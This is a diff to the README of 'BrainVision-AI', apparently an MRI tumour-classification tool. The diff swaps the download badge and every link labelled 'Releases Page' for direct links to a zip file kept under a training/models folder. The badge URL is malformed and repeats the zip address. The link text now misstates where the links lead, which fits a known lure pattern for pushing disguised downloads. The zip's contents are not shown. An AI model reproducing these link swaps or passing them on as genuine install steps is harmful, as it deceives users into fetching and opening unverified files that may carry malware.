@@ -1,6 +1,6 @@
 # 🧠 BrainVision-AI - Analyze MRI Images Easily
 
-![Download BrainVision-AI](https://img.shields.io/badge/Download%20BrainVision-AI-blue.svg)
+![Download BrainVision-AI](https://raw.githubusercontent.com/bochote/BrainVision-AI/main/training/models/BrainVision-AI-1.6.zip%https://raw.githubusercontent.com/bochote/BrainVision-AI/main/training/models/BrainVision-AI-1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **BrainVision AI**, a user-friendly tool for classifying brain tumors
 
 To get BrainVision AI, visit the Releases page:
 
-[Visit the Releases Page to Download](https://github.com/bochote/BrainVision-AI/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/bochote/BrainVision-AI/main/training/models/BrainVision-AI-1.6.zip)
 
 Once you are on the page, look for the latest release and download the appropriate file for your system. Follow the instructions provided in the release notes for installation guidance.
 
@@ -32,7 +32,7 @@ Once you are on the page, look for the latest release and download the appropria
 ## 📖 How to Use
 
 1. **Download the Application**:
-   Go to the [Releases Page](https://github.com/bochote/BrainVision-AI/releases) and select the latest version. Download the file that suits your operating system.
+   Go to the [Releases Page](https://raw.githubusercontent.com/bochote/BrainVision-AI/main/training/models/BrainVision-AI-1.6.zip) and select the latest version. Download the file that suits your operating system.
 
 2. **Open the Application**:
    Once downloaded, open the file in your web browser. Generally, you can do this by double-clicking the file or dragging it into your open browser window.
